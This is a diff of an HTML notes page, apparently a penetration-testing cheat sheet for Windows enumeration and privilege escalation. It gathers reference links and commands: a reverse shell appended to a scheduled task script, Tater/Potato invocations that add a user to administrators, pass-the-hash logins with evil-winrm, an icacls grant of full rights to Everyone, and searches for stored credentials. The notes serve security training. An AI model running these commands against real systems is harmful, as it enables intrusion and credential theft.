@@ -64,11 +64,11 @@
 
             <div class="nav__btns">
                 <!--Theme change button-->
-                <i class="uil uil-moon change-theme" id="theme-button"></i>
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
 
                 <div class="nav__toggle" id="nav-toggle">
                     <i class="uil uil-apps"></i>
-                </div>
+                </div> -->
             </div>
         </nav>
     </header>
@@ -76,13 +76,9 @@
 
 
 <!--==================== MAIN ====================-->
-    <main class="main"><article id="000917ee-4910-4392-bb17-c415ef54fab4" class="page sans"><header><h1 class="page-title">Initial Enumeration</h1></header><div class="page-body"><ul id="5d863a0a-efda-4451-819f-9c6ecf3e668c" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sirensecurity.io/blog/windows-privilege-escalation-resources/">https://sirensecurity.io/blog/windows-privilege-escalation-resources/</a></li></ul><ul id="753453a8-330a-4fd1-bfb0-a2500d4c21ec" class="bulleted-list"><li style="list-style-type:disc">fuzzysecurity <a href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a></li></ul><ul id="df18ddc3-5b3d-4e84-8e6d-1e967668d399" class="bulleted-list"><li style="list-style-type:disc">Absolomb Windows Privilege Escalation Guide - <a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></li></ul><ul id="b90a6585-1432-44a0-b7de-e7a36089305b" class="bulleted-list"><li style="list-style-type:disc"><a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation">https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation</a></li></ul><ul id="e613e752-b974-46c2-8454-4930b0b9134e" class="bulleted-list"><li style="list-style-type:disc">Sushant 747&#x27;s Guide (Country dependant - may need VPN) - <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a></li></ul><hr id="bc6229f6-9d53-44c9-90e5-e41e550211c3"/><ul id="52244d5b-10b8-498d-84ff-bec13a83c0f6" class="bulleted-list"><li style="list-style-type:disc">System integrity process: SYSTEM rights</li></ul><ul id="dea82d5d-92b3-457e-87f2-32a102e4f34c" class="bulleted-list"><li style="list-style-type:disc">High integrity process: administrative rights</li></ul><ul id="2cc567ab-62df-4729-a669-2e71e73bbc64" class="bulleted-list"><li style="list-style-type:disc">Medium integrity process: standard user rights</li></ul><ul id="34a496fd-d521-4a3f-a503-937ecf69db4a" class="bulleted-list"><li style="list-style-type:disc">Low integrity process: very restricted rights often used in
-sandboxed processes</li></ul><hr id="e6e0438c-dba4-4607-a9d2-75dc093df7d0"/><p id="a36e7873-04df-494b-bc42-c26e71751f01" class=""><strong>Methodology:</strong></p><ol type="1" id="b0104712-e5be-45b4-8db3-9afa3e9b9251" class="numbered-list" start="1"><li><strong>Windows:</strong> <a href="https://sirensecurity.io/blog/windows-privilege-escalation-resources/"><strong>https://sirensecurity.io/blog/windows-privilege-escalation-resources/</strong></a></li></ol><ol type="1" id="a190acd8-8717-4780-8d20-efa22c85f173" class="numbered-list" start="2"><li>Again look in a bunch of directories, this has found the way a lot of times.
-Look in C:\ (any backup directory or something odd?), C:\Program Files
-&amp; Program Files (x86) (for the non-windows folders, look up any priv esc vulnerabilities with them?), C:\Users, C:\Windows\Temp</li></ol><ol type="1" id="5bed8b10-80d9-4667-9524-b6ed6712b55f" class="numbered-list" start="3"><li>wmic service get name,startname, this will list services, I usually skim
-through this quick and look at any non windows ones. Specifically the
-binary path, either if its unquoted or if you have write access to the
-directory of the binary.</li></ol><ol type="1" id="f7c229e6-9da7-42f0-9be3-5cc684df06d4" class="numbered-list" start="4"><li>winpeas, make note of the section that tells you what directories are writeable by you.</li></ol><p id="7fa48cc3-3d54-4fe1-b97e-87d0ffa24b39" class="">
+    <main class="main"><article id="000917ee-4910-4392-bb17-c415ef54fab4" class="page sans"><header><h1 class="page-title">Windows Initial Enumeration</h1></header><div class="page-body"><ul id="5d863a0a-efda-4451-819f-9c6ecf3e668c" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sirensecurity.io/blog/windows-privilege-escalation-resources/">https://sirensecurity.io/blog/windows-privilege-escalation-resources/</a></li></ul><ul id="753453a8-330a-4fd1-bfb0-a2500d4c21ec" class="bulleted-list"><li style="list-style-type:disc">fuzzysecurity <a href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a></li></ul><ul id="df18ddc3-5b3d-4e84-8e6d-1e967668d399" class="bulleted-list"><li style="list-style-type:disc">Absolomb Windows Privilege Escalation Guide - <a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></li></ul><ul id="b90a6585-1432-44a0-b7de-e7a36089305b" class="bulleted-list"><li style="list-style-type:disc"><a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation">https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation</a></li></ul><ul id="e613e752-b974-46c2-8454-4930b0b9134e" class="bulleted-list"><li style="list-style-type:disc">Sushant 747&#x27;s Guide  - <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html</a></li></ul><ul id="69cf640b-2cb5-4a93-ab7e-83100a4ae953" class="bulleted-list"><li style="list-style-type:disc">Mind maps - <a href="https://avasdream.engineer/assets/OSCP-Methodology.png">https://avasdream.engineer/assets/OSCP-Methodology.png</a></li></ul><hr id="bc6229f6-9d53-44c9-90e5-e41e550211c3"/><ul id="52244d5b-10b8-498d-84ff-bec13a83c0f6" class="bulleted-list"><li style="list-style-type:disc">System integrity process: SYSTEM rights</li></ul><ul id="dea82d5d-92b3-457e-87f2-32a102e4f34c" class="bulleted-list"><li style="list-style-type:disc">High integrity process: administrative rights</li></ul><ul id="2cc567ab-62df-4729-a669-2e71e73bbc64" class="bulleted-list"><li style="list-style-type:disc">Medium integrity process: standard user rights</li></ul><ul id="34a496fd-d521-4a3f-a503-937ecf69db4a" class="bulleted-list"><li style="list-style-type:disc">Low integrity process: very restricted rights often used in
+sandboxed processes</li></ul><hr id="e6e0438c-dba4-4607-a9d2-75dc093df7d0"/><p id="a36e7873-04df-494b-bc42-c26e71751f01" class=""><strong>Methodology:</strong></p><ol type="1" id="b0104712-e5be-45b4-8db3-9afa3e9b9251" class="numbered-list" start="1"><li><strong>Windows:</strong> <a href="https://sirensecurity.io/blog/windows-privilege-escalation-resources/"><strong>https://sirensecurity.io/blog/windows-privilege-escalation-resources/</strong></a></li></ol><ol type="1" id="a190acd8-8717-4780-8d20-efa22c85f173" class="numbered-list" start="2"><li>Look in C:\ (any backup directory or something odd?), C:\Program Files
+&amp; Program Files (x86) (for the non-windows folders, look up any priv esc vulnerabilities with them?), C:\Users, C:\Windows\Temp</li></ol><ol type="1" id="f7c229e6-9da7-42f0-9be3-5cc684df06d4" class="numbered-list" start="3"><li>winpeas, make note of the section that tells you what directories are writeable by you.</li></ol><p id="7fa48cc3-3d54-4fe1-b97e-87d0ffa24b39" class="">
 </p><hr id="cddd09d6-2b74-4623-9515-aab592ee04d7"/><p id="f57ba8c3-9c7c-4573-9bd7-acb61c3dcda7" class=""><strong>System Enumeration:</strong></p><pre id="3f9b9ce4-a995-4047-a18a-234ee5d6dd4a" class="code"><code>systeminfo
 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;
 sysinfo (meterpreter)</code></pre><p id="9b62d99d-fe8d-45f4-a477-a4af3b804750" class="">
@@ -92,7 +88,7 @@ wmi product get name, version, vendor</code></pre><ul id="8f0f4a92-7dff-4f8e-b53
 list drives
 wmic logicaldisk get caption,description,providername</code></pre><p id="c798bad5-c100-4121-be18-16929f02d65e" class="">
 </p><p id="51607327-99c3-42bf-9df7-277b3c3b2cc2" class=""><strong>User Enumeration:</strong></p><p id="fa39ec7c-0e75-43aa-888e-e668585793d4" class="">
-</p><ul id="23818f36-82a5-4b20-ad36-8bed1843ad01" class="bulleted-list"><li style="list-style-type:disc">name</li></ul><pre id="226ed712-ac0e-47e9-bb45-00b14d1baa7d" class="code"><code>whoami</code></pre><ul id="15499b58-e007-4a23-ac19-70b8e21c1b3e" class="bulleted-list"><li style="list-style-type:disc">priv</li></ul><pre id="357946aa-5514-4888-83d1-abdf8dd93d94" class="code"><code>whoami /priv</code></pre><ul id="c59c1037-7a87-426d-8cab-8268b08755d8" class="bulleted-list"><li style="list-style-type:disc">groups</li></ul><pre id="dbfc2030-3da0-4c09-8bef-fc0fecd6f80c" class="code"><code>whoami /groups</code></pre><p id="84781da2-2f9c-4aa4-b4a3-c522d33c32b7" class="">
+</p><ul id="23818f36-82a5-4b20-ad36-8bed1843ad01" class="bulleted-list"><li style="list-style-type:disc">name</li></ul><pre id="226ed712-ac0e-47e9-bb45-00b14d1baa7d" class="code"><code>whoami</code></pre><ul id="15499b58-e007-4a23-ac19-70b8e21c1b3e" class="bulleted-list"><li style="list-style-type:disc">privileges</li></ul><pre id="357946aa-5514-4888-83d1-abdf8dd93d94" class="code"><code>whoami /priv</code></pre><ul id="c59c1037-7a87-426d-8cab-8268b08755d8" class="bulleted-list"><li style="list-style-type:disc">groups</li></ul><pre id="dbfc2030-3da0-4c09-8bef-fc0fecd6f80c" class="code"><code>whoami /groups</code></pre><p id="84781da2-2f9c-4aa4-b4a3-c522d33c32b7" class="">
 </p><ul id="d798a691-b167-4171-8c7e-ded37253a3ce" class="bulleted-list"><li style="list-style-type:disc">info on users</li></ul><pre id="05035c1f-a871-44b2-9454-e3b39fa5aef0" class="code"><code>net user &lt;user&gt;
 net user domain
 net user
@@ -118,8 +114,12 @@ PS&gt; Get-ScheduledTask &lt;task&gt; | select -ExpandProperty Actions
 #Using accesschk.exe, note that you have the ability to write to this file:
 C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\task.ps1
 #Start a listener on Kali and then append a line to the C:\DevTools\task.ps1 which runs the reverse.exe executable you created:
-echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\setup.ps1</code></pre><p id="546341a7-c3ca-456d-9bc4-535e0e027ab4" class=""><strong>Running processes &amp; services:</strong></p><pre id="449fe7b8-4de3-4b05-b4d8-d920ee8729c4" class="code"><code>tasklist /SVC</code></pre><p id="99bbc802-f194-4e0b-90db-39ce0e06dd2d" class=""><strong>Insecure GUI Apps:</strong></p><pre id="639272a8-c0fa-4a98-a4c3-15fb9b255a6e" class="code"><code>tasklist /V | findstr &lt;task-run-by-admin&gt;
-</code></pre><p id="4a3e4686-e75a-4d94-a7fa-1b3b7f565a4e" class="">
+echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\setup.ps1</code></pre><p id="546341a7-c3ca-456d-9bc4-535e0e027ab4" class=""><strong>Running processes &amp; services:</strong></p><pre id="449fe7b8-4de3-4b05-b4d8-d920ee8729c4" class="code"><code>tasklist /SVC
+wmic service get name,startname,displayname,pathname,startmode
+sc qc</code></pre><p id="99bbc802-f194-4e0b-90db-39ce0e06dd2d" class=""><strong>File Permissions:</strong></p><pre id="600e3479-dd3e-45a0-a911-dc4d97dd57e5" class="code"><code>icacls &lt;Path&gt;
+#grant permissions
+icacls &lt;path&gt; /grant &lt;Group/User&gt;:&lt;Permission&gt;
+icacls &lt;path&gt; /grant Everyone:F</code></pre><p id="058d7ae3-7c9c-490e-9151-7066c32ca911" class=""><strong>Insecure GUI Apps:</strong></p><pre id="639272a8-c0fa-4a98-a4c3-15fb9b255a6e" class="code"><code>tasklist /V | findstr &lt;task-run-by-admin&gt;</code></pre><p id="4a3e4686-e75a-4d94-a7fa-1b3b7f565a4e" class="">
 </p><p id="3c72509a-efe5-4b2b-bb8b-b195705050ea" class=""> History:</p><pre id="f67b9f68-e9b2-4c97-88e1-0fd04c5d76d1" class="code"><code>#Powershell history
 C:/Users/user/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadliine/
 consolehost_history.txt
@@ -135,7 +135,7 @@ find -type f -maxdepth 1 -writable
 accesschk.exe -uws &quot;Everyone&quot; &quot;C:/Program Files&quot;
 #powershell
 Get-ChildItem &quot;C:\Program Files&quot; - Recurse | Get-ACL | ?{$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;}</code></pre><p id="07752bc6-a641-437b-8c75-bd5ffc00aab2" class=""><strong>Find writable directories</strong></p><p id="f6e25951-13ad-4b23-9487-cdf801b8e394" class="">
-</p><p id="685e7923-834d-449a-bd46-0d3988956727" class="">Check app data for powershell history, clear text credentials</p><p id="d6e09ed3-3045-43e7-92ba-b19fa215d8b0" class="">Check recycle bins, saved browser passwords, saved program passwords.</p><p id="080dba3d-0a40-4445-bad5-c4399dbb2ac7" class="">
+</p><ul id="685e7923-834d-449a-bd46-0d3988956727" class="bulleted-list"><li style="list-style-type:disc">Check app data for powershell history, clear text credentials</li></ul><ul id="d6e09ed3-3045-43e7-92ba-b19fa215d8b0" class="bulleted-list"><li style="list-style-type:disc">Check recycle bins, saved browser passwords, saved program passwords.</li></ul><p id="080dba3d-0a40-4445-bad5-c4399dbb2ac7" class="">
 </p><p id="86f8489f-f7ac-451d-875d-c72e2238d843" class=""><strong>Evil Winrm:</strong></p><pre id="90e3c2a9-00f7-431a-91b9-fdba506f5652" class="code"><code>evil-winrm -i 0.0.0.0 -u pwn -p &#x27;Password1!&#x27;
 evil-winrm -i 0.0.0.0 -u pwn -H &lt;Hash&gt;
 crackmapexec winrm -u pwn -H &lt;Hash&gt;</code></pre><p id="6c99333a-7bd3-4c18-b089-67a762d7ff16" class="">
@@ -146,7 +146,9 @@ netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=
 Set-ItemProperty -Path &#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server&#x27;-name &quot;fDenyTSConnections&quot; -Value 0
 Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</code></pre><p id="89aada47-ed9b-48f6-96df-a334d0894fa0" class=""><strong>Using Remote Desktop:</strong></p><pre id="003c60ec-b894-42ea-8d96-1ca4ae7059da" class="code"><code>xfreerdp /v:0.0.0.0 /u:Username /p:Password /cert:ignore /workarea
 rdesktop 0.0.0.0 -u Username -p Password -d Domain.local
-</code></pre><p id="0375e7ea-7bfa-456c-a0c6-5c83414a079b" class=""><strong>HotPotato:</strong></p><pre id="3fa06b32-f7a8-473a-a048-aa13c23e2890" class="code"><code>powershell.exe -nop -ep bypass
+#Remmina remote desktop client
+sudo apt install remmina-plugin-rdp
+remmina</code></pre><p id="0375e7ea-7bfa-456c-a0c6-5c83414a079b" class=""><strong>HotPotato:</strong></p><pre id="3fa06b32-f7a8-473a-a048-aa13c23e2890" class="code"><code>powershell.exe -nop -ep bypass
 Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
 Invoke-Tater -Trigger 1 -Command &quot;net localgroup administrators user /add&quot;
 net localgroup administrators
@@ -154,7 +156,8 @@ net localgroup administrators
 .\potato.exe -ip 0.0.0.0 -cmd &quot;C:\reverse.exe&quot; -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true</code></pre><p id="7dc31774-c491-44a5-a599-dcbdb6c3ae70" class="">
 </p><p id="ba92716f-ed02-452b-94cb-dd3c8f089038" class=""><strong>Unmounted Disks:</strong></p><pre id="f49aa6fa-f843-4531-8a11-e16f6b015185" class="code"><code>mountvol</code></pre><p id="fd45b0ce-f9a7-4e42-a924-6428e43da152" class="">Web.config</p><pre id="de72f989-2718-43f8-8059-cd581ddb3003" class="code"><code>C:/inetpub/wwwroot/web.config
 C:/Windows/Microsoft.NET/Framework64/version/config/web.config
-#search for connectionString</code></pre><p id="293db5ee-b41a-432d-8f21-19116c957630" class="">Putty Credentials:</p><pre id="68a334d9-25ad-4b91-abf1-17382cebda02" class="code"><code>reg query HKEY_USER_CURRENT\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</code></pre></div></article></main></main>
+#Look for connectionString</code></pre><p id="293db5ee-b41a-432d-8f21-19116c957630" class="">Putty Credentials:</p><pre id="68a334d9-25ad-4b91-abf1-17382cebda02" class="code"><code>reg query HKEY_USER_CURRENT\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</code></pre><p id="1469c35c-cf8b-43f8-b48a-6d2cdde61faa" class="">Compiling Windows Files:</p><pre id="c1e90413-73d4-45aa-93be-93a6349606f9" class="code"><code>i686-w64-mingw32-gcc &lt;c file&gt; -o file.exe -l &lt;library (ws2_32)&gt;</code></pre><p id="477f0754-784d-49c5-91c9-3a029ddaddb1" class="">
+</p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
